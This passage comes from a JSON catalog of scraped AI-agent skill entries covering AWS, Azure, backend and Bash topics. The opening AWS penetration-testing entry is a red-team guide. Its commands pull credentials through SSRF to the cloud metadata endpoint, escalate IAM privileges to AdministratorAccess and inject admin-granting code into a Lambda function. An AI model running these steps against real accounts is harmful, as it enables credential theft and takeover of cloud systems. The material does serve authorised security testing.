      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/aws-penetration-testing",
      "content": "\n# AWS Penetration Testing\n\n## Purpose\n\nProvide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.\n\n## Inputs/Prerequisites\n\n- AWS CLI configured with credentials\n- Valid AWS credentials (even low-privilege)\n- Understanding of AWS IAM model\n- Python 3, boto3 library\n- Tools: Pacu, Prowler, ScoutSuite, SkyArk\n\n## Outputs/Deliverables\n\n- IAM privilege escalation paths\n- Extracted credentials and secrets\n- Compromised EC2/Lambda/S3 resources\n- Persistence mechanisms\n- Security audit findings\n\n---\n\n## Essential Tools\n\n| Tool | Purpose | Installation |\n|------|---------|--------------|\n| Pacu | AWS exploitation framework | `git clone https://github.com/RhinoSecurityLabs/pacu` |\n| SkyArk | Shadow Admin discovery | `Import-Module .\\SkyArk.ps1` |\n| Prowler | Security auditing | `pip install prowler` |\n| ScoutSuite | Multi-cloud auditing | `pip install scoutsuite` |\n| enumerate-iam | Permission enumeration | `git clone https://github.com/andresriancho/enumerate-iam` |\n| Principal Mapper | IAM analysis | `pip install principalmapper` |\n\n---\n\n## Core Workflow\n\n### Step 1: Initial Enumeration\n\nIdentify the compromised identity and permissions:\n\n```bash\n# Check current identity\naws sts get-caller-identity\n\n# Configure profile\naws configure --profile compromised\n\n# List access keys\naws iam list-access-keys\n\n# Enumerate permissions\n./enumerate-iam.py --access-key AKIA... --secret-key StF0q...\n```\n\n### Step 2: IAM Enumeration\n\n```bash\n# List all users\naws iam list-users\n\n# List groups for user\naws iam list-groups-for-user --user-name TARGET_USER\n\n# List attached policies\naws iam list-attached-user-policies --user-name TARGET_USER\n\n# List inline policies\naws iam list-user-policies --user-name TARGET_USER\n\n# Get policy details\naws iam get-policy --policy-arn POLICY_ARN\naws iam get-policy-version --policy-arn POLICY_ARN --version-id v1\n\n# List roles\naws iam list-roles\naws iam list-attached-role-policies --role-name ROLE_NAME\n```\n\n### Step 3: Metadata SSRF (EC2)\n\nExploit SSRF to access metadata endpoint (IMDSv1):\n\n```bash\n# Access metadata endpoint\nhttp://169.254.169.254/latest/meta-data/\n\n# Get IAM role name\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# Extract temporary credentials\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME\n\n# Response contains:\n{\n  \"AccessKeyId\": \"ASIA...\",\n  \"SecretAccessKey\": \"...\",\n  \"Token\": \"...\",\n  \"Expiration\": \"2019-08-01T05:20:30Z\"\n}\n```\n\n**For IMDSv2 (token required):**\n\n```bash\n# Get token first\nTOKEN=$(curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \\\n  \"http://169.254.169.254/latest/api/token\")\n\n# Use token for requests\ncurl -H \"X-aws-ec2-metadata-token:$TOKEN\" \\\n  \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n```\n\n**Fargate Container Credentials:**\n\n```bash\n# Read environment for credential path\n/proc/self/environ\n# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...\n\n# Access credentials\nhttp://169.254.170.2/v2/credentials/CREDENTIAL-PATH\n```\n\n---\n\n## Privilege Escalation Techniques\n\n### Shadow Admin Permissions\n\nThese permissions are equivalent to administrator:\n\n| Permission | Exploitation |\n|------------|--------------|\n| `iam:CreateAccessKey` | Create keys for admin user |\n| `iam:CreateLoginProfile` | Set password for any user |\n| `iam:AttachUserPolicy` | Attach admin policy to self |\n| `iam:PutUserPolicy` | Add inline admin policy |\n| `iam:AddUserToGroup` | Add self to admin group |\n| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |\n| `lambda:UpdateFunctionCode` | Inject code into Lambda |\n\n### Create Access Key for Another User\n\n```bash\naws iam create-access-key --user-name target_user\n```\n\n### Attach Admin Policy\n\n```bash\naws iam attach-user-policy --user-name my_username \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n```\n\n### Add Inline Admin Policy\n\n```bash\naws iam put-user-policy --user-name my_username \\\n  --policy-name admin_policy \\\n  --policy-document file://admin-policy.json\n```\n\n### Lambda Privilege Escalation\n\n```python\n# code.py - Inject into Lambda function\nimport boto3\n\ndef lambda_handler(event, context):\n    client = boto3.client('iam')\n    response = client.attach_user_policy(\n        UserName='my_username',\n        PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\"\n    )\n    return response\n```\n\n```bash\n# Update Lambda code\naws lambda update-function-code --function-name target_function \\\n  --zip-file fileb://malicious.zip\n```\n\n---\n\n## S3 Bucket Exploitation\n\n### Bucket Discovery\n\n```bash\n# Using bucket_finder\n./bucket_finder.rb wordlist.txt\n./bucket_finder.rb --download --region us-east-1 wordlist.txt\n\n# Common bucket URL patterns\nhttps://{bucket-name}.s3.amazonaws.com\nhttps://s3.amazonaws.com/{bucket-name}\n```\n\n### Bucket Enumeration\n\n",
      "tags": [
        "python",
        "api",
        "ai",
        "agent",
        "workflow",
        "document",
        "security",
        "pentest",
        "vulnerability",
        "aws"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:52.251Z"
    },
    {
      "id": "antigravity-aws-serverless",
      "name": "aws-serverless",
      "slug": "aws-serverless",
      "description": "Specialized skill for building production-ready serverless applications on AWS. Covers Lambda functions, API Gateway, DynamoDB, SQS/SNS event-driven patterns, SAM/CDK deployment, and cold start optimization.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/aws-serverless",
      "content": "\n# AWS Serverless\n\n## Patterns\n\n### Lambda Handler Pattern\n\nProper Lambda function structure with error handling\n\n**When to use**: ['Any Lambda function implementation', 'API handlers, event processors, scheduled tasks']\n\n```python\n```javascript\n// Node.js Lambda Handler\n// handler.js\n\n// Initialize outside handler (reused across invocations)\nconst { DynamoDBClient } = require('@aws-sdk/client-dynamodb');\nconst { DynamoDBDocumentClient, GetCommand } = require('@aws-sdk/lib-dynamodb');\n\nconst client = new DynamoDBClient({});\nconst docClient = DynamoDBDocumentClient.from(client);\n\n// Handler function\nexports.handler = async (event, context) => {\n  // Optional: Don't wait for event loop to clear (Node.js)\n  context.callbackWaitsForEmptyEventLoop = false;\n\n  try {\n    // Parse input based on event source\n    const body = typeof event.body === 'string'\n      ? JSON.parse(event.body)\n      : event.body;\n\n    // Business logic\n    const result = await processRequest(body);\n\n    // Return API Gateway compatible response\n    return {\n      statusCode: 200,\n      headers: {\n        'Content-Type': 'application/json',\n        'Access-Control-Allow-Origin': '*'\n      },\n      body: JSON.stringify(result)\n    };\n  } catch (error) {\n    console.error('Error:', JSON.stringify({\n      error: error.message,\n      stack: error.stack,\n      requestId: context.awsRequestId\n    }));\n\n    return {\n      statusCode: error.statusCode || 500,\n      headers: { 'Content-Type': 'application/json' },\n      body: JSON.stringify({\n        error: error.message || 'Internal server error'\n      })\n    };\n  }\n};\n\nasync function processRequest(data) {\n  // Your business logic here\n  const result = await docClient.send(new GetCommand({\n    TableName: process.env.TABLE_NAME,\n    Key: { id: data.id }\n  }));\n  return result.Item;\n}\n```\n\n```python\n# Python Lambda Handler\n# handler.py\n\nimport json\nimport os\nimport logging\nimport boto3\nfrom botocore.exceptions import ClientError\n\n# Initialize outside handler (reused across invocations)\nlogger = logging.getLogger()\nlogger.setLevel(logging.INFO)\n\ndynamodb = boto3.resource('dynamodb')\ntable = dynamodb.Table(os.environ['TABLE_NAME'])\n\ndef handler(event, context):\n    try:\n        # Parse i\n```\n\n### API Gateway Integration Pattern\n\nREST API and HTTP API integration with Lambda\n\n**When to use**: ['Building REST APIs backed by Lambda', 'Need HTTP endpoints for functions']\n\n```javascript\n```yaml\n# template.yaml (SAM)\nAWSTemplateFormatVersion: '2010-09-09'\nTransform: AWS::Serverless-2016-10-31\n\nGlobals:\n  Function:\n    Runtime: nodejs20.x\n    Timeout: 30\n    MemorySize: 256\n    Environment:\n      Variables:\n        TABLE_NAME: !Ref ItemsTable\n\nResources:\n  # HTTP API (recommended for simple use cases)\n  HttpApi:\n    Type: AWS::Serverless::HttpApi\n    Properties:\n      StageName: prod\n      CorsConfiguration:\n        AllowOrigins:\n          - \"*\"\n        AllowMethods:\n          - GET\n          - POST\n          - DELETE\n        AllowHeaders:\n          - \"*\"\n\n  # Lambda Functions\n  GetItemFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      Handler: src/handlers/get.handler\n      Events:\n        GetItem:\n          Type: HttpApi\n          Properties:\n            ApiId: !Ref HttpApi\n            Path: /items/{id}\n            Method: GET\n      Policies:\n        - DynamoDBReadPolicy:\n            TableName: !Ref ItemsTable\n\n  CreateItemFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      Handler: src/handlers/create.handler\n      Events:\n        CreateItem:\n          Type: HttpApi\n          Properties:\n            ApiId: !Ref HttpApi\n            Path: /items\n            Method: POST\n      Policies:\n        - DynamoDBCrudPolicy:\n            TableName: !Ref ItemsTable\n\n  # DynamoDB Table\n  ItemsTable:\n    Type: AWS::DynamoDB::Table\n    Properties:\n      AttributeDefinitions:\n        - AttributeName: id\n          AttributeType: S\n      KeySchema:\n        - AttributeName: id\n          KeyType: HASH\n      BillingMode: PAY_PER_REQUEST\n\nOutputs:\n  ApiUrl:\n    Value: !Sub \"https://${HttpApi}.execute-api.${AWS::Region}.amazonaws.com/prod\"\n```\n\n```javascript\n// src/handlers/get.js\nconst { getItem } = require('../lib/dynamodb');\n\nexports.handler = async (event) => {\n  const id = event.pathParameters?.id;\n\n  if (!id) {\n    return {\n      statusCode: 400,\n      body: JSON.stringify({ error: 'Missing id parameter' })\n    };\n  }\n\n  const item =\n```\n\n### Event-Driven SQS Pattern\n\nLambda triggered by SQS for reliable async processing\n\n**When to use**: ['Decoupled, asynchronous processing', 'Need retry logic and DLQ', 'Processing messages in batches']\n\n```python\n```yaml\n# template.yaml\nResources:\n  ProcessorFunction:\n    Type: AWS::Serverless::Function\n    Properties:\n      Handler: src/handlers/processor.handler\n      Events:\n        SQSEvent:\n          Type: SQS\n          Properties:\n            Queue: !GetAtt ProcessingQueue.Arn\n            BatchSize: 10\n            FunctionResponseTypes:\n             ",
      "tags": [
        "python",
        "javascript",
        "node",
        "api",
        "ai",
        "template",
        "document",
        "aws",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:54.552Z"
    },
    {
      "id": "openhands-azure-devops",
      "name": "azure_devops",
      "slug": "azure-devops",
      "description": "You have access to an environment variable, `AZURE_DEVOPS_TOKEN`, which allows you to interact with",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/azure_devops.md",
      "content": "\nYou have access to an environment variable, `AZURE_DEVOPS_TOKEN`, which allows you to interact with\nthe Azure DevOps API.\n\n<IMPORTANT>\nYou can use `curl` with the `AZURE_DEVOPS_TOKEN` to interact with Azure DevOps's API.\nALWAYS use the Azure DevOps API for operations instead of a web browser.\n</IMPORTANT>\n\nIf you encounter authentication issues when pushing to Azure DevOps (such as password prompts or permission errors), the old token may have expired. In such case, update the remote URL to include the current token: `git remote set-url origin https://${AZURE_DEVOPS_TOKEN}@dev.azure.com/organization/project/_git/repository`\n\nHere are some instructions for pushing, but ONLY do this if the user asks you to:\n* NEVER push directly to the `main` or `master` branch\n* Git config (username and email) is pre-set. Do not modify.\n* You may already be on a branch starting with `openhands-workspace`. Create a new branch with a better name before pushing.\n* Once you've created your own branch or a pull request, continue to update it. Do NOT create a new one unless you are explicitly asked to. Update the PR title and description as necessary, but don't change the branch name.\n* Use the main branch as the base branch, unless the user requests otherwise\n* After opening or updating a pull request, send the user a short message with a link to the pull request.\n* Do NOT mark a pull request as ready to review unless the user explicitly says so\n* Do all of the above in as few steps as possible. E.g. you could push changes with one step by running the following bash commands:\n```bash\ngit remote -v && git branch # to find the current org, repo and branch\ngit checkout -b create-widget && git add . && git commit -m \"Create widget\" && git push -u origin create-widget\n```\n\n## Azure DevOps API Usage\n\nWhen working with Azure DevOps API, you need to use Basic authentication with your Personal Access Token (PAT). The username is ignored (empty string), and the password is the PAT.\n\nHere's how to authenticate with curl:\n```bash\n# Convert PAT to base64\nAUTH=$(echo -n \":$AZURE_DEVOPS_TOKEN\" | base64)\n\n# Make API call\ncurl -H \"Authorization: Basic $AUTH\" -H \"Content-Type: application/json\" https://dev.azure.com/{organization}/{project}/_apis/git/repositories?api-version=7.1\n```\n\nCommon API endpoints:\n- List repositories: `https://dev.azure.com/{organization}/{project}/_apis/git/repositories?api-version=7.1`\n- Get repository details: `https://dev.azure.com/{organization}/{project}/_apis/git/repositories/{repositoryId}?api-version=7.1`\n- List pull requests: `https://dev.azure.com/{organization}/{project}/_apis/git/pullrequests?api-version=7.1`\n- Create pull request: `https://dev.azure.com/{organization}/{project}/_apis/git/repositories/{repositoryId}/pullrequests?api-version=7.1` (POST)\n",
      "tags": [
        "git",
        "azure",
        "bash",
        "pr",
        "agent",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:27.569Z"
    },
    {
      "id": "antigravity-azure-functions",
      "name": "azure-functions",
      "slug": "azure-functions",
      "description": "Expert patterns for Azure Functions development including isolated worker model, Durable Functions orchestration, cold start optimization, and production patterns. Covers .NET, Python, and Node.js programming models. Use when: azure function, azure functions, durable functions, azure serverless, fun",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/azure-functions",
      "content": "\n# Azure Functions\n\n## Patterns\n\n### Isolated Worker Model (.NET)\n\nModern .NET execution model with process isolation\n\n### Node.js v4 Programming Model\n\nModern code-centric approach for TypeScript/JavaScript\n\n### Python v2 Programming Model\n\nDecorator-based approach for Python functions\n\n## Anti-Patterns\n\n### ❌ Blocking Async Calls\n\n### ❌ New HttpClient Per Request\n\n### ❌ In-Process Model for New Projects\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | high | ## Use async pattern with Durable Functions |\n| Issue | high | ## Use IHttpClientFactory (Recommended) |\n| Issue | high | ## Always use async/await |\n| Issue | medium | ## Configure maximum timeout (Consumption) |\n| Issue | high | ## Use isolated worker for new projects |\n| Issue | medium | ## Configure Application Insights properly |\n| Issue | medium | ## Check extension bundle (most common) |\n| Issue | medium | ## Add warmup trigger to initialize your code |\n",
      "tags": [
        "python",
        "javascript",
        "typescript",
        "node",
        "ai",
        "azure"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:55.879Z"
    },
    {
      "id": "antigravity-backend-dev-guidelines",
      "name": "backend-dev-guidelines",
      "slug": "backend-dev-guidelines",
      "description": "Opinionated backend development standards for Node.js + Express + TypeScript microservices. Covers layered architecture, BaseController pattern, dependency injection, Prisma repositories, Zod validation, unifiedConfig, Sentry error tracking, async safety, and testing discipline.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/backend-dev-guidelines",
      "content": "\n# Backend Development Guidelines\n\n**(Node.js · Express · TypeScript · Microservices)**\n\nYou are a **senior backend engineer** operating production-grade services under strict architectural and reliability constraints.\n\nYour goal is to build **predictable, observable, and maintainable backend systems** using:\n\n* Layered architecture\n* Explicit error boundaries\n* Strong typing and validation\n* Centralized configuration\n* First-class observability\n\nThis skill defines **how backend code must be written**, not merely suggestions.\n\n---\n\n## 1. Backend Feasibility & Risk Index (BFRI)\n\nBefore implementing or modifying a backend feature, assess feasibility.\n\n### BFRI Dimensions (1–5)\n\n| Dimension                     | Question                                                         |\n| ----------------------------- | ---------------------------------------------------------------- |\n| **Architectural Fit**         | Does this follow routes → controllers → services → repositories? |\n| **Business Logic Complexity** | How complex is the domain logic?                                 |\n| **Data Risk**                 | Does this affect critical data paths or transactions?            |\n| **Operational Risk**          | Does this impact auth, billing, messaging, or infra?             |\n| **Testability**               | Can this be reliably unit + integration tested?                  |\n\n### Score Formula\n\n```\nBFRI = (Architectural Fit + Testability) − (Complexity + Data Risk + Operational Risk)\n```\n\n**Range:** `-10 → +10`\n\n### Interpretation\n\n| BFRI     | Meaning   | Action                 |\n| -------- | --------- | ---------------------- |\n| **6–10** | Safe      | Proceed                |\n| **3–5**  | Moderate  | Add tests + monitoring |\n| **0–2**  | Risky     | Refactor or isolate    |\n| **< 0**  | Dangerous | Redesign before coding |\n\n---\n\n## 2. When to Use This Skill\n\nAutomatically applies when working on:\n\n* Routes, controllers, services, repositories\n* Express middleware\n* Prisma database access\n* Zod validation\n* Sentry error tracking\n* Configuration management\n* Backend refactors or migrations\n\n---\n\n## 3. Core Architecture Doctrine (Non-Negotiable)\n\n### 1. Layered Architecture Is Mandatory\n\n```\nRoutes → Controllers → Services → Repositories → Database\n```\n\n* No layer skipping\n* No cross-layer leakage\n* Each layer has **one responsibility**\n\n---\n\n### 2. Routes Only Route\n\n```ts\n// ❌ NEVER\nrouter.post('/create', async (req, res) => {\n  await prisma.user.create(...);\n});\n\n// ✅ ALWAYS\nrouter.post('/create', (req, res) =>\n  userController.create(req, res)\n);\n```\n\nRoutes must contain **zero business logic**.\n\n---\n\n### 3. Controllers Coordinate, Services Decide\n\n* Controllers:\n\n  * Parse request\n  * Call services\n  * Handle response formatting\n  * Handle errors via BaseController\n\n* Services:\n\n  * Contain business rules\n  * Are framework-agnostic\n  * Use DI\n  * Are unit-testable\n\n---\n\n### 4. All Controllers Extend `BaseController`\n\n```ts\nexport class UserController extends BaseController {\n  async getUser(req: Request, res: Response): Promise<void> {\n    try {\n      const user = await this.userService.getById(req.params.id);\n      this.handleSuccess(res, user);\n    } catch (error) {\n      this.handleError(error, res, 'getUser');\n    }\n  }\n}\n```\n\nNo raw `res.json` calls outside BaseController helpers.\n\n---\n\n### 5. All Errors Go to Sentry\n\n```ts\ncatch (error) {\n  Sentry.captureException(error);\n  throw error;\n}\n```\n\n❌ `console.log`\n❌ silent failures\n❌ swallowed errors\n\n---\n\n### 6. unifiedConfig Is the Only Config Source\n\n```ts\n// ❌ NEVER\nprocess.env.JWT_SECRET;\n\n// ✅ ALWAYS\nimport { config } from '@/config/unifiedConfig';\nconfig.auth.jwtSecret;\n```\n\n---\n\n### 7. Validate All External Input with Zod\n\n* Request bodies\n* Query params\n* Route params\n* Webhook payloads\n\n```ts\nconst schema = z.object({\n  email: z.string().email(),\n});\n\nconst input = schema.parse(req.body);\n```\n\nNo validation = bug.\n\n---\n\n## 4. Directory Structure (Canonical)\n\n```\nsrc/\n├── config/              # unifiedConfig\n├── controllers/         # BaseController + controllers\n├── services/            # Business logic\n├── repositories/        # Prisma access\n├── routes/              # Express routes\n├── middleware/          # Auth, validation, errors\n├── validators/          # Zod schemas\n├── types/               # Shared types\n├── utils/               # Helpers\n├── tests/               # Unit + integration tests\n├── instrument.ts        # Sentry (FIRST IMPORT)\n├── app.ts               # Express app\n└── server.ts            # HTTP server\n```\n\n---\n\n## 5. Naming Conventions (Strict)\n\n| Layer      | Convention                |\n| ---------- | ------------------------- |\n| Controller | `PascalCaseController.ts` |\n| Service    | `camelCaseService.ts`     |\n| Repository | `PascalCaseRepository.ts` |\n| Routes     | `camelCaseRoutes.ts`      |\n| Validators | `camelCase.schema.ts`     |\n\n---\n\n## 6. Dependency Injection Rules\n\n* Services receive dependencies via constructo",
      "tags": [
        "typescript",
        "node",
        "api",
        "ai",
        "design",
        "prisma",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:57.173Z"
    },
    {
      "id": "antigravity-cc-skill-backend-patterns",
      "name": "backend-patterns",
      "slug": "cc-skill-backend-patterns",
      "description": "Backend architecture patterns, API design, database optimization, and server-side best practices for Node.js, Express, and Next.js API routes.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/cc-skill-backend-patterns",
      "content": "\n# Backend Development Patterns\n\nBackend architecture patterns and best practices for scalable server-side applications.\n\n## API Design Patterns\n\n### RESTful API Structure\n\n```typescript\n// ✅ Resource-based URLs\nGET    /api/markets                 # List resources\nGET    /api/markets/:id             # Get single resource\nPOST   /api/markets                 # Create resource\nPUT    /api/markets/:id             # Replace resource\nPATCH  /api/markets/:id             # Update resource\nDELETE /api/markets/:id             # Delete resource\n\n// ✅ Query parameters for filtering, sorting, pagination\nGET /api/markets?status=active&sort=volume&limit=20&offset=0\n```\n\n### Repository Pattern\n\n```typescript\n// Abstract data access logic\ninterface MarketRepository {\n  findAll(filters?: MarketFilters): Promise<Market[]>\n  findById(id: string): Promise<Market | null>\n  create(data: CreateMarketDto): Promise<Market>\n  update(id: string, data: UpdateMarketDto): Promise<Market>\n  delete(id: string): Promise<void>\n}\n\nclass SupabaseMarketRepository implements MarketRepository {\n  async findAll(filters?: MarketFilters): Promise<Market[]> {\n    let query = supabase.from('markets').select('*')\n\n    if (filters?.status) {\n      query = query.eq('status', filters.status)\n    }\n\n    if (filters?.limit) {\n      query = query.limit(filters.limit)\n    }\n\n    const { data, error } = await query\n\n    if (error) throw new Error(error.message)\n    return data\n  }\n\n  // Other methods...\n}\n```\n\n### Service Layer Pattern\n\n```typescript\n// Business logic separated from data access\nclass MarketService {\n  constructor(private marketRepo: MarketRepository) {}\n\n  async searchMarkets(query: string, limit: number = 10): Promise<Market[]> {\n    // Business logic\n    const embedding = await generateEmbedding(query)\n    const results = await this.vectorSearch(embedding, limit)\n\n    // Fetch full data\n    const markets = await this.marketRepo.findByIds(results.map(r => r.id))\n\n    // Sort by similarity\n    return markets.sort((a, b) => {\n      const scoreA = results.find(r => r.id === a.id)?.score || 0\n      const scoreB = results.find(r => r.id === b.id)?.score || 0\n      return scoreA - scoreB\n    })\n  }\n\n  private async vectorSearch(embedding: number[], limit: number) {\n    // Vector search implementation\n  }\n}\n```\n\n### Middleware Pattern\n\n```typescript\n// Request/response processing pipeline\nexport function withAuth(handler: NextApiHandler): NextApiHandler {\n  return async (req, res) => {\n    const token = req.headers.authorization?.replace('Bearer ', '')\n\n    if (!token) {\n      return res.status(401).json({ error: 'Unauthorized' })\n    }\n\n    try {\n      const user = await verifyToken(token)\n      req.user = user\n      return handler(req, res)\n    } catch (error) {\n      return res.status(401).json({ error: 'Invalid token' })\n    }\n  }\n}\n\n// Usage\nexport default withAuth(async (req, res) => {\n  // Handler has access to req.user\n})\n```\n\n## Database Patterns\n\n### Query Optimization\n\n```typescript\n// ✅ GOOD: Select only needed columns\nconst { data } = await supabase\n  .from('markets')\n  .select('id, name, status, volume')\n  .eq('status', 'active')\n  .order('volume', { ascending: false })\n  .limit(10)\n\n// ❌ BAD: Select everything\nconst { data } = await supabase\n  .from('markets')\n  .select('*')\n```\n\n### N+1 Query Prevention\n\n```typescript\n// ❌ BAD: N+1 query problem\nconst markets = await getMarkets()\nfor (const market of markets) {\n  market.creator = await getUser(market.creator_id)  // N queries\n}\n\n// ✅ GOOD: Batch fetch\nconst markets = await getMarkets()\nconst creatorIds = markets.map(m => m.creator_id)\nconst creators = await getUsers(creatorIds)  // 1 query\nconst creatorMap = new Map(creators.map(c => [c.id, c]))\n\nmarkets.forEach(market => {\n  market.creator = creatorMap.get(market.creator_id)\n})\n```\n\n### Transaction Pattern\n\n```typescript\nasync function createMarketWithPosition(\n  marketData: CreateMarketDto,\n  positionData: CreatePositionDto\n) {\n  // Use Supabase transaction\n  const { data, error } = await supabase.rpc('create_market_with_position', {\n    market_data: marketData,\n    position_data: positionData\n  })\n\n  if (error) throw new Error('Transaction failed')\n  return data\n}\n\n// SQL function in Supabase\nCREATE OR REPLACE FUNCTION create_market_with_position(\n  market_data jsonb,\n  position_data jsonb\n)\nRETURNS jsonb\nLANGUAGE plpgsql\nAS $$\nBEGIN\n  -- Start transaction automatically\n  INSERT INTO markets VALUES (market_data);\n  INSERT INTO positions VALUES (position_data);\n  RETURN jsonb_build_object('success', true);\nEXCEPTION\n  WHEN OTHERS THEN\n    -- Rollback happens automatically\n    RETURN jsonb_build_object('success', false, 'error', SQLERRM);\nEND;\n$$;\n```\n\n## Caching Strategies\n\n### Redis Caching Layer\n\n```typescript\nclass CachedMarketRepository implements MarketRepository {\n  constructor(\n    private baseRepo: MarketRepository,\n    private redis: RedisClient\n  ) {}\n\n  async findById(id: string): Promise<Market | null> {\n    // Check ca",
      "tags": [
        "typescript",
        "node",
        "api",
        "ai",
        "design",
        "supabase"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:19.197Z"
    },
    {
      "id": "antigravity-bash-linux",
      "name": "bash-linux",
      "slug": "bash-linux",
      "description": "Bash/Linux terminal patterns. Critical commands, piping, error handling, scripting. Use when working on macOS or Linux systems.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/bash-linux",
      "content": "\n# Bash Linux Patterns\n\n> Essential patterns for Bash on Linux/macOS.\n\n---\n\n## 1. Operator Syntax\n\n### Chaining Commands\n\n| Operator | Meaning | Example |\n|----------|---------|---------|\n| `;` | Run sequentially | `cmd1; cmd2` |\n| `&&` | Run if previous succeeded | `npm install && npm run dev` |\n| `\\|\\|` | Run if previous failed | `npm test \\|\\| echo \"Tests failed\"` |\n| `\\|` | Pipe output | `ls \\| grep \".js\"` |\n\n---\n\n## 2. File Operations\n\n### Essential Commands\n\n| Task | Command |\n|------|---------|\n| List all | `ls -la` |\n| Find files | `find . -name \"*.js\" -type f` |\n| File content | `cat file.txt` |\n| First N lines | `head -n 20 file.txt` |\n| Last N lines | `tail -n 20 file.txt` |\n| Follow log | `tail -f log.txt` |\n| Search in files | `grep -r \"pattern\" --include=\"*.js\"` |\n| File size | `du -sh *` |\n| Disk usage | `df -h` |\n\n---\n\n## 3. Process Management\n\n| Task | Command |\n|------|---------|\n| List processes | `ps aux` |\n| Find by name | `ps aux \\| grep node` |\n| Kill by PID | `kill -9 <PID>` |\n| Find port user | `lsof -i :3000` |\n| Kill port | `kill -9 $(lsof -t -i :3000)` |\n| Background | `npm run dev &` |\n| Jobs | `jobs -l` |\n| Bring to front | `fg %1` |\n\n---\n\n## 4. Text Processing\n\n### Core Tools\n\n| Tool | Purpose | Example |\n|------|---------|---------|\n| `grep` | Search | `grep -rn \"TODO\" src/` |\n| `sed` | Replace | `sed -i 's/old/new/g' file.txt` |\n| `awk` | Extract columns | `awk '{print $1}' file.txt` |\n| `cut` | Cut fields | `cut -d',' -f1 data.csv` |\n| `sort` | Sort lines | `sort -u file.txt` |\n| `uniq` | Unique lines | `sort file.txt \\| uniq -c` |\n| `wc` | Count | `wc -l file.txt` |\n\n---\n\n## 5. Environment Variables\n\n| Task | Command |\n|------|---------|\n| View all | `env` or `printenv` |\n| View one | `echo $PATH` |\n| Set temporary | `export VAR=\"value\"` |\n| Set in script | `VAR=\"value\" command` |\n| Add to PATH | `export PATH=\"$PATH:/new/path\"` |\n\n---\n\n## 6. Network\n\n| Task | Command |\n|------|---------|\n| Download | `curl -O https://example.com/file` |\n| API request | `curl -X GET https://api.example.com` |\n| POST JSON | `curl -X POST -H \"Content-Type: application/json\" -d '{\"key\":\"value\"}' URL` |\n| Check port | `nc -zv localhost 3000` |\n| Network info | `ifconfig` or `ip addr` |\n\n---\n\n## 7. Script Template\n\n```bash\n#!/bin/bash\nset -euo pipefail  # Exit on error, undefined var, pipe fail\n\n# Colors (optional)\nRED='\\033[0;31m'\nGREEN='\\033[0;32m'\nNC='\\033[0m'\n\n# Script directory\nSCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\n\n# Functions\nlog_info() { echo -e \"${GREEN}[INFO]${NC} $1\"; }\nlog_error() { echo -e \"${RED}[ERROR]${NC} $1\" >&2; }\n\n# Main\nmain() {\n    log_info \"Starting...\"\n    # Your logic here\n    log_info \"Done!\"\n}\n\nmain \"$@\"\n```\n\n---\n\n## 8. Common Patterns\n\n### Check if command exists\n\n```bash\nif command -v node &> /dev/null; then\n    echo \"Node is installed\"\nfi\n```\n\n### Default variable value\n\n```bash\nNAME=${1:-\"default_value\"}\n```\n\n### Read file line by line\n\n```bash\nwhile IFS= read -r line; do\n    echo \"$line\"\ndone < file.txt\n```\n\n### Loop over files\n\n```bash\nfor file in *.js; do\n    echo \"Processing $file\"\ndone\n```\n\n---\n\n## 9. Differences from PowerShell\n\n| Task | PowerShell | Bash |\n|------|------------|------|\n| List files | `Get-ChildItem` | `ls -la` |\n| Find files | `Get-ChildItem -Recurse` | `find . -type f` |\n| Environment | `$env:VAR` | `$VAR` |\n| String concat | `\"$a$b\"` | `\"$a$b\"` (same) |\n| Null check | `if ($x)` | `if [ -n \"$x\" ]` |\n| Pipeline | Object-based | Text-based |\n\n---\n\n## 10. Error Handling\n\n### Set options\n\n```bash\nset -e          # Exit on error\nset -u          # Exit on undefined variable\nset -o pipefail # Exit on pipe failure\nset -x          # Debug: print commands\n```\n\n### Trap for cleanup\n\n```bash\ncleanup() {\n    echo \"Cleaning up...\"\n    rm -f /tmp/tempfile\n}\ntrap cleanup EXIT\n```\n\n---\n\n> **Remember:** Bash is text-based. Use `&&` for success chains, `set -e` for safety, and quote your variables!\n",
      "tags": [
        "node",
        "api",
        "ai",
